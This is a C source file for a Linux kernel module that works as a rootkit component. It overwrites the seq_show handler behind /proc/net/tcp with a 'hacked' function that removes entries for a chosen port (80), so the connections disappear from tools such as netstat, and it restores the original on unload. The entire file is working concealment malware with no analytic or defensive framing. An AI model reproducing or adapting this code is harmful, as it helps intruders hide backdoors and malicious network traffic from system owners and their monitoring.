#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/init.h>
#include <net/tcp.h>

#define TMPSZ 150

#define PORT_TO_HIDE 80

MODULE_LICENSE ("GPL");

int (*orig_tcp4_seq_show)(struct seq_file*, void *) = NULL;

char *strnstr(const char *haystack, const char *needle, size_t n)
{
  char *s = strstr(haystack, needle);
  if (s == NULL)
    return NULL;
  if ( (s - haystack + strlen(needle)) <= n)
    return s;
  else
    return NULL;
}

int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
{
  int retval = orig_tcp4_seq_show(seq, v);

  char port[12];

  sprintf(port, "%04X", PORT_TO_HIDE);

  if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
    seq->count -= TMPSZ;
  return retval;
}


int init_module(void)
{
  struct tcp_seq_afinfo *our_afinfo = NULL;
  struct proc_dir_entry *our_dir_entry = proc_net->subdir;

  while (strcmp(our_dir_entry->name, "tcp"))
    our_dir_entry = our_dir_entry->next;

  if ( (our_afinfo = (struct tcp_seq_afinfo*)our_dir_entry->data))
  {
    orig_tcp4_seq_show = our_afinfo->seq_show;
    our_afinfo->seq_show = hacked_tcp4_seq_show;
  }

  return 0;
}

void cleanup_module(void)
{
  struct tcp_seq_afinfo *our_afinfo = NULL;
  struct proc_dir_entry *our_dir_entry = proc_net->subdir;

  while (strcmp(our_dir_entry->name, "tcp"))
    our_dir_entry = our_dir_entry->next;

  if ( (our_afinfo = (struct tcp_seq_afinfo *)our_dir_entry->data))
  {
    our_afinfo->seq_show = orig_tcp4_seq_show;
  }
}
